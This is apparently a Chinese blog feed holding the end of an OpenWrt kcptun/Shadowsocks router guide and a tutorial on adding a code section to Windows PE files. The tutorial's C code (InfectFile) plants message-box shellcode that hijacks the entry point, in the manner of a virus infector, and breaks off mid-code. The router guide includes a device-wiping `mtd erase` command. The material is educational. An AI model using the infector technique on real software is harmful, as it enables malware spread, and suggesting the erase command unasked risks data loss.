<p>具体流程为， ss-tunnel 将 GoogleDNS(8.8.8.8:53) 转发到 127.0.0.1:1153 上，然后通过 ChinaDNS 与国内 DNS 组合成新的 127.0.0.1:1053，从而实现了国内外分流。</p>
<h1 id="0x04-部署-Kcptun"><a href="#0x04-部署-Kcptun" class="headerlink" title="0x04 部署 Kcptun"></a>0x04 部署 Kcptun</h1><h2 id="1-安装客户端"><a href="#1-安装客户端" class="headerlink" title="1.  安装客户端"></a>1.  安装客户端</h2><p>Kcptun 部署需要确保服务端和客户端版本的一致性，只有版本一致才能正常使用。首先<br>在 <a href="https://github.com/xtaci/kcptun/releases" target="_blank" rel="external">kcptun项目</a> 中下载相应版本的客户端，这里下载 <a href="https://github.com/xtaci/kcptun/releases/download/v20170525/kcptun-linux-mipsle-20170525.tar.gz" target="_blank" rel="external">kcptun-linux-mipsle-20170525.tar.gz</a>，解压后将 client_linux_mipsle 上传至路由器中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp client_linux_mipsle root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>:/root/kcptun/client_linux_mipsle</div></pre></td></tr></table></figure></p>
<p>若提示以下内存不足错误将导致传输失败，可使用<code>mtd -r erase rootfs_data</code>命令清除设备中的所有数据以腾出内存空间，<strong><em>但这样做会导致配置信息丢失</em></strong>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">No space left on device openwrt</div></pre></td></tr></table></figure></p>
<p>传输完成后修改 /etc/rc.local 设置 kcptun 为开机启动。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Put your custom commands here that should be executed once</span></div><div class="line"><span class="comment"># the system init finished. By default this file does nothing.</span></div><div class="line"><span class="comment"># IPv4</span></div><div class="line">/root/kcptun/client_linux_mipsle -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8388</span> -r xxx.xxx.xxx.xxx:<span class="number">9523</span> -key xxxxxx -mtu <span class="number">1350</span> -sndwnd <span class="number">512</span> -rcvwnd <span class="number">512</span> -mode fast2 -crypt aes<span class="number">-192</span> -nocomp true &gt; /root/kcptun/kcptun.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</div><div class="line"><span class="comment"># or IPv6</span></div><div class="line">/root/kcptun/client_linux_mipsle -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8388</span> -r [xx:xx:xx:xx:xx:xx:xx:xx]:<span class="number">9523</span> -key xxxxxx -mtu <span class="number">1350</span> -sndwnd <span class="number">512</span> -rcvwnd <span class="number">512</span> -mode fast2 -crypt aes<span class="number">-192</span> -nocomp true &gt; /root/kcptun/kcptun.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</div><div class="line">exit <span class="number">0</span></div></pre></td></tr></table></figure></p>
<p>注释：<br>/root/kcptun/client_linux_mipsle：client_linux_mipsle的绝对路径<br>-l：kcptun 本地监听的端口<br>-r：kcptun 服务器地址（可设置为 IPv6）和端口<br>-key：kcptun的通讯密钥</p>
<p>修改 SS 客户端服务器 IP 和端口，密码等其他参数仍为原 SS 的参数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务器地址：<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></div><div class="line">服务器端口: <span class="number">8388</span></div></pre></td></tr></table></figure></p>
<p>重启路由器后测试能否访问 Google。</p>
<h2 id="2-安装-kcptun-web-管理界面"><a href="#2-安装-kcptun-web-管理界面" class="headerlink" title="2. 安装 kcptun web 管理界面"></a>2. 安装 kcptun web 管理界面</h2><p>此外，还可以安装 <a href="https://github.com/kuoruan/luci-app-kcptun" target="_blank" rel="external">Kcptun 的 web 管理界面</a>。</p>
<h2 id="3-附录-–-配置信息"><a href="#3-附录-–-配置信息" class="headerlink" title="3. 附录 – 配置信息"></a>3. 附录 – 配置信息</h2><p>以下为 K2 路由器中的配置信息。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ipv6</span></div><div class="line">/root/kcptun/client_linux_mipsle -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8388</span> -r [xxxx:xxxx:xxxx:xxxx:<span class="number">16</span>d7:<span class="number">3</span>cd1:xxxx:xxxx]:<span class="number">9523</span> -key xxxx -mtu <span class="number">1350</span> -sndwnd <span class="number">512</span> -rcvwnd <span class="number">512</span> -mode fast2 -crypt aes<span class="number">-192</span> -nocomp true &gt; /root/kcptun/kcptun.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</div><div class="line"><span class="comment"># ipv4</span></div><div class="line">/root/kcptun/client_linux_mipsle -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8388</span> -r xxx.xxx.xxx.xxx:<span class="number">9523</span> -key xxxx -mtu <span class="number">1350</span> -sndwnd <span class="number">512</span> -rcvwnd <span class="number">512</span> -mode fast2 -crypt aes<span class="number">-192</span> -nocomp true &gt; /root/kcptun/kcptun.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</div></pre></td></tr></table></figure></p>
<p>服务端配置如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># cat /usr/local/kcptun/server-config.json</span></div><div class="line">[root@localhost kcptun]</div><div class="line">&#123;</div><div class="line">  <span class="string">"listen"</span>: <span class="string">":9523"</span>,</div><div class="line">  <span class="string">"target"</span>: <span class="string">"127.0.0.1:443"</span>,</div><div class="line">  <span class="string">"key"</span>: <span class="string">"xxxx"</span>,</div><div class="line">  <span class="string">"crypt"</span>: <span class="string">"aes-192"</span>,</div><div class="line">  <span class="string">"mode"</span>: <span class="string">"fast2"</span>,</div><div class="line">  <span class="string">"mtu"</span>: 1350,</div><div class="line">  <span class="string">"sndwnd"</span>: 512,</div><div class="line">  <span class="string">"rcvwnd"</span>: 512,</div><div class="line">  <span class="string">"datashard"</span>: 10,</div><div class="line">  <span class="string">"parityshard"</span>: 3,</div><div class="line">  <span class="string">"dscp"</span>: 0,</div><div class="line">  <span class="string">"nocomp"</span>: <span class="literal">true</span>,</div><div class="line">  <span class="string">"pprof"</span>: <span class="literal">false</span>,</div><div class="line">  <span class="string">"acknodelay"</span>: <span class="literal">false</span>,</div><div class="line">  <span class="string">"sockbuf"</span>: 4194304,</div><div class="line">  <span class="string">"keepalive"</span>: 10</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>客户端可用以下配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="string">"localaddr"</span>: <span class="string">":443"</span>,</div><div class="line">  <span class="string">"remoteaddr"</span>: <span class="string">"xxx.xxx.xxx.xxx:9523"</span>,</div><div class="line">  <span class="string">"key"</span>: <span class="string">"xxxx"</span>,</div><div class="line">  <span class="string">"crypt"</span>: <span class="string">"aes-192"</span>,</div><div class="line">  <span class="string">"mode"</span>: <span class="string">"fast2"</span>,</div><div class="line">  <span class="string">"mtu"</span>: 1350,</div><div class="line">  <span class="string">"sndwnd"</span>: 512,</div><div class="line">  <span class="string">"rcvwnd"</span>: 512,</div><div class="line">  <span class="string">"datashard"</span>: 10,</div><div class="line">  <span class="string">"parityshard"</span>: 3,</div><div class="line">  <span class="string">"dscp"</span>: 0,</div><div class="line">  <span class="string">"nocomp"</span>: <span class="literal">true</span>,</div><div class="line">  <span class="string">"acknodelay"</span>: <span class="literal">false</span>,</div><div class="line">  <span class="string">"sockbuf"</span>: 4194304,</div><div class="line">  <span class="string">"keepalive"</span>: 10</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Android 中 SS 远程端口设置为远程服务器 SS 端口，kcptun 配置如下，注意不能有空格：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># IPV6</span></div><div class="line">remoteaddr=[xxxx:xxxx:xxxx:xxxx:16d7:3<span class="built_in">cd</span>1:xxxx:xxxx]::9523;key=xxxxxx;mtu=1350;sndwnd=512;rcvwnd=512;mode=fast2;crypt=aes-192;nocomp=<span class="literal">true</span></div><div class="line"><span class="comment"># IPV4</span></div><div class="line">remoteaddr=xxx.xxx.xxx.xxx:9523;key=xxxxxx;mtu=1350;sndwnd=512;rcvwnd=512;mode=fast2;crypt=aes-192;nocomp=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="http://www.right.com.cn/forum/thread-202060-1-1.html" target="_blank" rel="external">在openwrt上部署kcptun给搬瓦工加速看1080p</a><br>[2] <a href="https://keyin.me/2017/02/07/Pandorabox-transparent-proxy/" target="_blank" rel="external">Pandorabox之透明代理</a><br>[3] <a href="https://blog.kuoruan.com/102.html" target="_blank" rel="external">Kcptun加速方案</a><br>[4] <a href="http://www.bwgcn.xyz/?p=159" target="_blank" rel="external">如何用Kcptun给Shadowsocks加速？</a><br>[5] <a href="https://blog.kuoruan.com/113.html" target="_blank" rel="external">OpenWrt 平台 Kcptun 管理界面 lui-app-kcptun</a><br>[6] <a href="http://aes.jypc.org/?p=19339" target="_blank" rel="external">Openwrt华硕固件Kcptun配置使用教程</a><br>[7] <a href="http://phyer.click/zh/2017/08/28/lede-shadowsocks/" target="_blank" rel="external">Lede 17.01 shadowsocks设置</a><br>[8] <a href="https://cokebar.info/archives/664" target="_blank" rel="external">Shadowsocks + ChnRoute 实现 OpenWRT / LEDE 路由器自动翻墙</a><br>[9] <a href="https://cyhour.com/479/" target="_blank" rel="external">OpenWrt 路由器安装 KCPTun 客户端</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> K2 </tag>
            
            <tag> Shadowsocks </tag>
            
            <tag> kcptun，IPv6 免流 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PE 文件中添加节区]]></title>
      <url>/2017/0723/a-section-in-the-pe-file/</url>
      <content type="html"><![CDATA[<p>在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。</p>
<p>打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙中。对于恶意代码而言，以这种方式感染目标文件更具隐蔽性。</p>
<p>当补丁代码或病毒需注入的代码量较大时，可以在 PE 文件的末尾添加一个节区用于存储这些代码。下面介绍如何在 PE 文件中添加一个节区。</p>
<h1 id="0x01-手动添加"><a href="#0x01-手动添加" class="headerlink" title="0x01 手动添加"></a>0x01 手动添加</h1><p>使用 C32asm 可以很方便地定位并修改 PE 文件的各个字段，点击 “查看” / “PE信息” 可打开 PE 结构字段的解析面板。添加节区的具体流程如下。</p>
<h2 id="1-添加一个-IMAGE-SECTION-HEADER"><a href="#1-添加一个-IMAGE-SECTION-HEADER" class="headerlink" title="1. 添加一个 IMAGE_SECTION_HEADER"></a>1. 添加一个 IMAGE_SECTION_HEADER</h2><p>首先在原来节表的末尾添加一个节表，IMAGE_SECTION_HEADER 结构体中要设置的字段有以下6个：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Name: .<span class="keyword">new</span></div><div class="line">VirtualSize: <span class="number">0x450</span> <span class="comment">// 该字段可不用对齐</span></div><div class="line">VirtualAddress: <span class="number">0x9000</span> <span class="comment">// 上一节区的 VirtualAddress + 对齐后的 VirtualSize</span></div><div class="line">SizeOfRawData: <span class="number">0x600</span> <span class="comment">// 该字段为对齐后的值</span></div><div class="line">PointerToRawData: <span class="number">0x5200</span> <span class="comment">// 上一节区的 PointerToRawData + SizeOfRawData</span></div><div class="line">Characteristics：<span class="number">0x60000020</span>  <span class="comment">// 与 .text段一致</span></div></pre></td></tr></table></figure></p>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/52134100.jpg" alt=""></p>
<h2 id="2-修改-NumberOfSection"><a href="#2-修改-NumberOfSection" class="headerlink" title="2. 修改 NumberOfSection"></a>2. 修改 NumberOfSection</h2><p>添加一个节表之后需要修改 IMAGE_FILE_HEADER 中的 NumberOfSection 字段，将节区数量由 4 改为 5。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/41073536.jpg" alt=""></p>
<h2 id="3-修改-SizeOfImage"><a href="#3-修改-SizeOfImage" class="headerlink" title="3. 修改 SizeOfImage"></a>3. 修改 SizeOfImage</h2><p>接着修改文件映像大小，即 IMAGE_OPTIONAL_HEADER 中的 SizeOfImage 字段，该字段按内存对齐方式对齐，在原大小（0x9000）的基础上加上新节区的大小（0x450），对齐后为 0xa000。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/28635670.jpg" alt=""></p>
<h2 id="4-添加节区数据"><a href="#4-添加节区数据" class="headerlink" title="4. 添加节区数据"></a>4. 添加节区数据</h2><p>最后添加新增节区的数据，把光标移到文件的末尾，点击 “编辑” / “插入数据”，插入数据大小为 1536(0x600)，使用 00 填充，点击确认，保存即可。</p>
<p>到此，已成功添加了一个节区，修改之后的程序仍是可运行的，使用 PEview 查看新增节区如下：</p>
<p><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-7-21/63364761.jpg" alt=""></p>
<p>这里需要注意插入数据的大小要按磁盘对齐方式对齐，不然最终修改后的文件无法运行，并提示“该文件不是有效的 Win32 应用程序”。</p>
<h1 id="0x02-编程实现"><a href="#0x02-编程实现" class="headerlink" title="0x02 编程实现"></a>0x02 编程实现</h1><p>恶意代码为了实现其隐蔽性，在其感染 PE 文件时会将代码执行权交给被插入的代码，所以恶意代码通常会先被执行，执行完后再跳转至原 PE 文件中的代码继续执行。</p>
<p>添加节区主要通过内存映射文件和 PE 操作完成，将文件映射到内存中后可以通过内存指针方便地访问文件。下面主要介绍添加新节区的代码实现。</p>
<h2 id="1-将文件映射到内存"><a href="#1-将文件映射到内存" class="headerlink" title="1. 将文件映射到内存"></a>1. 将文件映射到内存</h2><p>首先用 CreateFile() 打开文件，然后使用 CreateFileMapping() 和 MapViewOfFile() 函数把文件映射到内存中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	HANDLE hFile = CreateFile(fpath,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( hFile  == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	HANDLE hMapFile = CreateFileMapping(hFile,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (!hMapFile)&#123;</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (!pHdr)&#123;</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>CreateFileMapping() 函数定义如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line">	HANDLE                hFile,  <span class="comment">//handle to the file</span></div><div class="line">	LPSECURITY_ATTRIBUTES lpAttributes, <span class="comment">//pointer to SECURITY_ATTRIBUTES structure</span></div><div class="line">	DWORD                 flProtect,  <span class="comment">//page protection of the file mapping object</span></div><div class="line">	DWORD                 dwMaximumSizeHigh,</div><div class="line">	DWORD                 dwMaximumSizeLow,</div><div class="line">	LPCTSTR               lpName</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>MapViewOfFile() 函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></div><div class="line">	HANDLE hFileMappingObject,  <span class="comment">//handle to a file mapping object</span></div><div class="line">	DWORD  dwDesiredAccess, <span class="comment">//type of access to a file mapping object</span></div><div class="line">	DWORD  dwFileOffsetHigh,</div><div class="line">	DWORD  dwFileOffsetLow,</div><div class="line">	SIZE_T dwNumberOfBytesToMap <span class="comment">//number of bytes of a file mapping to map to the view</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<h2 id="2-检查-PE-文件"><a href="#2-检查-PE-文件" class="headerlink" title="2. 检查 PE 文件"></a>2. 检查 PE 文件</h2><p>文件映射后要检查是否为有效的 PE 文件，同时为了避免重复感染，需要检查目标文件是否已被感染。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 判断是否为正常PE文件</span></div><div class="line">	<span class="keyword">if</span> (!IsPeFile(pHdr))&#123;</div><div class="line">		UnmapViewOfFile(pHdr);</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//判断是否已被感染</span></div><div class="line">	<span class="keyword">if</span> (IsInfected(pHdr))&#123;</div><div class="line">		UnmapViewOfFile(pHdr);</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>IsPeFile() 和 IsInfected() 函数的实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">检查是否为正常PE文件</div><div class="line">*/</div><div class="line"><span class="function">BOOL <span class="title">IsPeFile</span><span class="params">(PVOID pHdr)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="comment">//判断DOS头标志是否正确</span></div><div class="line">	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;</div><div class="line">	<span class="keyword">if</span> (p1-&gt;e_magic != IMAGE_DOS_SIGNATURE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//判断PE头标志是否正确</span></div><div class="line">	IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1-&gt;e_lfanew);</div><div class="line">	<span class="keyword">if</span> (p2-&gt;Signature != IMAGE_NT_SIGNATURE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">判断文件是否被感染</div><div class="line">*/</div><div class="line"><span class="function">BOOL <span class="title">IsInfected</span><span class="params">(PVOID pHdr)</span></span></div><div class="line">&#123;</div><div class="line">	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;</div><div class="line">	<span class="comment">//判断DOS头的保留位是否已被填充为 0xABCD</span></div><div class="line">	<span class="keyword">if</span> ( p-&gt;e_res2[<span class="number">0</span>] == (WORD)INFECTFLAG)&#123;</div><div class="line">		<span class="keyword">return</span> TRUE;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		p-&gt;e_res2[<span class="number">0</span>] = (WORD)INFECTFLAG;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="3-添加节表"><a href="#3-添加节表" class="headerlink" title="3. 添加节表"></a>3. 添加节表</h2><p>添加一个节区需要在 PE 文件中添加一个节表，此外还需修改 NumberOfSections 和 SizeOfImage 字段。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">//PE头指针： 文件头指针+DOS头的e_lfanew位指定的PE头偏移</span></div><div class="line">	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)-&gt;e_lfanew);</div><div class="line">	<span class="comment">//节区头指针： PE头指针+PE头的长度</span></div><div class="line">	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</div><div class="line"></div><div class="line">	<span class="comment">//两个对齐单位</span></div><div class="line">	DWORD dwFileAlign = pNTHdr-&gt;OptionalHeader.FileAlignment;</div><div class="line">	DWORD dwSecAlign  = pNTHdr-&gt;OptionalHeader.SectionAlignment;</div><div class="line">	<span class="comment">//最后一个节指针</span></div><div class="line">	IMAGE_SECTION_HEADER *pLastSec = &amp;pSecHdr[pNTHdr-&gt;FileHeader.NumberOfSections<span class="number">-1</span>];</div><div class="line">	<span class="comment">//定义一个新节</span></div><div class="line">	IMAGE_SECTION_HEADER *pNewSec = &amp;pSecHdr[pNTHdr-&gt;FileHeader.NumberOfSections];</div><div class="line">	<span class="comment">//原入口地址（OEP）</span></div><div class="line">	DWORD dwOldOEP = pNTHdr-&gt;OptionalHeader.AddressOfEntryPoint + pNTHdr-&gt;OptionalHeader.ImageBase;</div><div class="line">	<span class="comment">//需插入的代码长度</span></div><div class="line">	DWORD dwCodeSize  = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;</div><div class="line"></div><div class="line">	<span class="comment">//填充新节表的各字段</span></div><div class="line">	<span class="built_in">memcpy</span>(pNewSec-&gt;Name,<span class="string">".new"</span>,<span class="number">5</span>);</div><div class="line">	pNewSec-&gt;Misc.VirtualSize = dwCodeSize;</div><div class="line">	pNewSec-&gt;VirtualAddress		=	pLastSec-&gt;VirtualAddress + Align(pLastSec-&gt;Misc.VirtualSize, dwSecAlign);</div><div class="line">	pNewSec-&gt;SizeOfRawData		=	Align(dwCodeSize,dwFileAlign);</div><div class="line">	pNewSec-&gt;PointerToRawData	=	pLastSec-&gt;PointerToRawData + pLastSec-&gt;SizeOfRawData;</div><div class="line">	pNewSec-&gt;Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;</div><div class="line"></div><div class="line">	<span class="comment">//节区数目加 1</span></div><div class="line">	pNTHdr-&gt;FileHeader.NumberOfSections++;</div><div class="line">	<span class="comment">//修正PE镜像大小</span></div><div class="line">	pNTHdr-&gt;OptionalHeader.SizeOfImage += Align(pNewSec-&gt;Misc.VirtualSize,dwSecAlign);</div><div class="line"> 	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>VS2010 中默认设置时，计算 Shellcode 长度时无法正确获取函数在内存中的地址，需要将修改项目属性：配置属性/链接器/常规/关闭增量链接。</p>
<h2 id="4-插入节区数据"><a href="#4-插入节区数据" class="headerlink" title="4. 插入节区数据"></a>4. 插入节区数据</h2><p>病毒通常会将带有恶意行为的代码插入新节区的数据段，被插入的代码称为 Shellcode，这里只是插入一段弹消息框的代码，Shellcode 通常使用汇编实现，下面是内联汇编代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> __declspec(naked) ShellcodeStart()</div><div class="line">&#123;</div><div class="line">	__asm &#123;</div><div class="line">			pushad</div><div class="line">			call    routine</div><div class="line"></div><div class="line">	routine :</div><div class="line">			pop     ebp</div><div class="line">			sub      ebp, offset routine</div><div class="line">			push    <span class="number">0</span>                                <span class="comment">// MB_OK</span></div><div class="line">			lea       eax, [ebp + szCaption]</div><div class="line">			push    eax                              <span class="comment">// lpCaption</span></div><div class="line">			lea	   eax, [ebp + szText]</div><div class="line">			push    eax                              <span class="comment">// lpText</span></div><div class="line">			push    <span class="number">0</span>                                <span class="comment">// hWnd</span></div><div class="line">			mov     eax, <span class="number">0xAAAAAAAA</span></div><div class="line">			call      eax                            <span class="comment">// MessageBoxA</span></div><div class="line"></div><div class="line">			popad</div><div class="line">			push    <span class="number">0xBBBBBBBB</span>                       <span class="comment">// OEP</span></div><div class="line">			ret</div><div class="line"></div><div class="line">	szCaption :</div><div class="line">			db(<span class="string">'V'</span>) db(<span class="string">'i'</span>) db(<span class="string">'r'</span>) db(<span class="string">'u'</span>) db(<span class="string">'s'</span>) db(<span class="number">0</span>)</div><div class="line">	szText :</div><div class="line">			db(<span class="string">'I'</span>) db(<span class="string">'n'</span>) db(<span class="string">'f'</span>) db(<span class="string">'l'</span>) db(<span class="string">'e'</span>) db(<span class="string">'c'</span>) db(<span class="string">'t'</span>) db(<span class="string">' '</span>) db(<span 